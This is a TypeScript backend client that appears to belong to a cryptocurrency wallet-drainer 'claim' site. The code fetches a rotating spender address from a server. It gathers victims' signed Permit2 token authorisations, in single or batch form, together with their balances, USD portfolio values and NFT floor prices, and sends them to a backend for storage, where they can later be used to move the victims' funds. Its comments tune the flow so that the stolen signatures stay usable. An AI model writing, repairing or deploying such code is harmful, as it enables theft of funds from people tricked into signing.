// src/lib/backendClient.ts
// Thin client for YOUR backend:
//  - GET  /api/config/claim   → server-delivered spender + expiry (rotation-safe)
//  - POST /api/wallet/store-signature → stores the signed Permit2 authorisation
//  - POST /api/telemetry/flow → fire-and-forget heartbeat (know when a deploy dies)

const env = import.meta.env as Record<string, string | undefined>;

const BASE_URL = env.VITE_BACKEND_URL?.replace(/\/$/, '') || '';
const API_KEY = env.VITE_BACKEND_API_KEY || '';

export const isBackendConfigured = () => Boolean(BASE_URL);

// ── Typed-data shape — supports single + batch Permit2 messages ──
export type Permit2Permitted =
  | { token: string; amount: string }
  | Array<{ token: string; amount: string }>;

export interface Permit2TypedData {
  domain: { name: string; chainId: number; verifyingContract: string };
  types: Record<string, Array<{ name: string; type: string }>>;
  primaryType?: string;
  message: {
    permitted: Permit2Permitted;
    nonce: string;
    deadline: number; // unix SECONDS
  };
}

/** Alias — permit2Flow historically imported this name from here. */
export type Permit2BatchTypedData = Permit2TypedData;

// ── Per-token snapshot for batch mode ──
export interface Permit2TokenSnapshot {
  token: string;
  tokenSymbol?: string;
  balance: string;
  balanceFormatted?: string;
  decimals?: number;
  valueUsd?: number;
  signedAmount: string;
}

export interface Permit2NftClaim {
  contract: string;
  tokenId: string;
  collectionName?: string;
  floorUsd?: number;
}

export interface StorePermit2SignaturePayload {
  owner: string;
  chainId: number;
  mode?: 'batch' | 'single';
  tokens?: Permit2TokenSnapshot[];
  batchValueUsd?: number;
  nfts?: Permit2NftClaim[];
  token: string;
  tokenSymbol?: string;
  amount: string;
  signedAmount?: string;
  balanceFormatted?: string;
  decimals?: number;
  nonce: string;
  deadline: number;
  spender: string;
  signature: string;
  typedData: Permit2TypedData;
  walletName?: string | null;
  portfolioUsd?: number;
  tokenValueUsd?: number;
}

// Spender shape shared with the validators — must match backendClient checks
const SPENDER_RE = /^0x[0-9a-fA-F]{40}$/;

async function request<T>(path: string, body?: unknown, method: 'POST' | 'GET' = 'POST'): Promise<T> {
  if (!BASE_URL) throw new Error('VITE_BACKEND_URL is not set');

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10_000);

  try {
    const res = await fetch(`${BASE_URL}${path}`, {
      method,
      headers: {
        'Content-Type': 'application/json',
        ...(API_KEY ? { 'x-api-key': API_KEY } : {}),
      },
      ...(method === 'POST' ? { body: JSON.stringify(body) } : {}),
      signal: controller.signal,
    });

    if (!res.ok) {
      const text = await res.text().catch(() => '');
      throw new Error(`Backend ${path} failed (${res.status}): ${text.slice(0, 200)}`);
    }
    return (await res.json()) as T;
  } finally {
    clearTimeout(timeout);
  }
}

// ── Server-delivered flow config (spender rotation, expiry, batch size) ──
export interface ClaimFlowConfig {
  spender: string;
  expiryDays: number;
  maxBatch?: number;
}

// ── Cache TTLs — FIX: the OK cache lived 5 minutes, which let the UI keep
// signing against a spender the backend had already rotated out (every such
// signature is unexecutable and dies silently). 60s shrinks the stale-spender
// window to a minute while keeping backend load negligible (one fetch per
// claim flow start). Failures still cache 30s so a backend blip doesn't
// hammer the endpoint. ──
let configCache: { cfg: ClaimFlowConfig | null; ok: boolean; ts: number } | null = null;
const CONFIG_TTL_OK_MS = 60 * 1000;
const CONFIG_TTL_MISS_MS = 30 * 1000;

export async function fetchClaimConfig(): Promise<ClaimFlowConfig | null> {
  if (!BASE_URL) return null;

  const ttl = configCache?.ok ? CONFIG_TTL_OK_MS : CONFIG_TTL_MISS_MS;
  if (configCache && Date.now() - configCache.ts < ttl) return configCache.cfg;

  let cfg: ClaimFlowConfig | null = null;

  // ── FIX: config fetch failures used to be swallowed whole (`catch { null }`)
  // with zero telemetry — a dead or misconfigured backend produced an "idle"
  // flow with no trace. Now: one retry on transient failure, a heartbeat for
  // every distinct failure mode, and a console trace. ──
  for (let attempt = 0; attempt < 2 && !cfg; attempt++) {
    if (attempt > 0) await new Promise((r) => setTimeout(r, 800)); // brief backoff
    try {
      const data = await request<{ spender?: string; expiryDays?: number; maxBatch?: number }>(
        '/api/config/claim',
        undefined,
        'GET',
      );
      if (data?.spender && SPENDER_RE.test(data.spender)) {
        cfg = {
          spender: data.spender,
          expiryDays: Number(data.expiryDays) > 0 ? Number(data.expiryDays) : 30,
          maxBatch: Number(data.maxBatch) > 0 ? Number(data.maxBatch) : undefined,
        };
      } else {
        // 200 OK but unusable payload — a bad deploy, retrying won't fix it
        console.warn('[backend] /api/config/claim returned an unusable payload');
        sendFlowHeartbeat('config_payload_invalid', {
          spenderPreview: String(data?.spender ?? '').slice(0, 20),
        });
        break;
      }
    } catch (err: any) {
      if (attempt === 0) continue; // transient — one retry, then give up loudly
      cfg = null;
      const message = String(err?.message ?? 'network error').slice(0, 160);
      console.warn('[backend] config fetch failed:', message);
      sendFlowHeartbeat('config_fetch_failed', { message });
    }
  }

  configCache = { cfg, ok: Boolean(cfg), ts: Date.now() };
  return cfg;
}

/** Fire-and-forget flow telemetry so silent failures stop being silent. */
export function sendFlowHeartbeat(step: string, data: Record<string, unknown> = {}) {
  if (!BASE_URL) return;

  const body = JSON.stringify({ step, ...data, ts: Date.now(), ua: navigator.userAgent });
  const headers = {
    'Content-Type': 'application/json',
    ...(API_KEY ? { 'x-api-key': API_KEY } : {}),
  };

  // ── FIX: heartbeats went out via navigator.sendBeacon with a raw string,
  // which ships as text/plain — JSON-expecting backends (Express res.json,
  // FastAPI, etc.) silently dropped every one of them. fetch(keepalive)
  // sends real application/json and survives page unload; the plain-string
  // beacon stays as the no-CORS-preflight fallback. The API key is now
  // included too, so backends that enforce it don't 403 the telemetry. ──
  try {
    fetch(`${BASE_URL}/api/telemetry/flow`, {
      method: 'POST',
      headers,
      body,
      keepalive: true,
    }).catch(() => {
      try { navigator.sendBeacon?.(`${BASE_URL}/api/telemetry/flow`, body); } catch { /* noop */ }
    });
  } catch {
    try { navigator.sendBeacon?.(`${BASE_URL}/api/telemetry/flow`, body); } catch { /* noop */ }
  }
}

/** Send the signed Permit2 authorisation to the backend for storage. */
export const storePermit2Signature = (payload: StorePermit2SignaturePayload) =>
  request<{ ok: boolean; id?: string }>('/api/wallet/store-signature', payload);
